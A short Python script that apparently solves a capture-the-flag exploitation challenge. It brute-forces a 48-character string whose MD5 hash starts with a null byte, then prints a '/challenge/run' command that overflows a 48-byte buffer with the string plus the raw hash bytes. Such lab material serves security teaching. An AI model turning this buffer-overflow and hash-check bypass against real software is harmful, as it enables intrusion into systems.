import string

import hashlib

letters = string.ascii_letters + string.digits
letters_len = len(letters)


def make_str(num, length):
    s = ""
    while len(s) < length:
        s += letters[num % letters_len]
        num = num // letters_len

    s = s[::-1]
    return s


def get_hash(length, hash_start):
    possibilities = letters_len**length
    s, string_hash = "", ""
    for num in range(0, possibilities):
        s = make_str(num, length)
        if num % 10 == 1:
            print(s)
        string_hash = hashlib.md5(s.encode()).digest().hex()
        if string_hash[: len(hash_start)] == hash_start:
            break

    hash = ""
    for i in range(0, len(string_hash), 2):
        hash = hash + "\\x" + string_hash[i : i + 2]

    return s, hash


buffer_len = 0x30  # 48 bytes
s, string_hash = get_hash(buffer_len, "00")
print("/challenge/run $'", s + string_hash, "'", sep="")
